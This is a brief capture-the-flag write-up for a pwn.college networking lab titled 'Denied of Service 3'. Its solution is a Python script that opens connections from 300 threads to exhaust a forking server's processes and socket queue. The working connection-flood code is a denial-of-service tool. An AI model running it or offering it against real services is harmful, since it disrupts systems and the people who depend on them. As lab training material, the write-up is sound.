---
tags: ["Computer Networking"]
title: "Denied of Service 3"
description: Denied of Service 3
reference: https://pwn.college/intro-to-cybersecurity/intercepting-communication/
---

# Problem

The client at 10.0.0.3 is communicating with the server at 10.0.0.2 on port 31337. Deny this service.

This time the server forks a new process for each client connection, and limits each session to 1 second.

# Solution

1. know we dont have capability to craft and a TCP reset packet

```python
user_host.interactive(preexec_fn=lambda: limit_capabilities(0), environ=parent_process.environ())
```

2. Try to exhaust the server’s forks or socket queue

```python
import socket
import time
import threading

def spam():
    while True:
        try:
            s = socket.create_connection(("10.0.0.2", 31337), timeout=2)
            time.sleep(2)
            s.close()
        except:
            pass

for _ in range(300):  # tweak based on system capacity
    threading.Thread(target=spam, daemon=True).start()

time.sleep(120)  # let it run long enough to disrupt
```
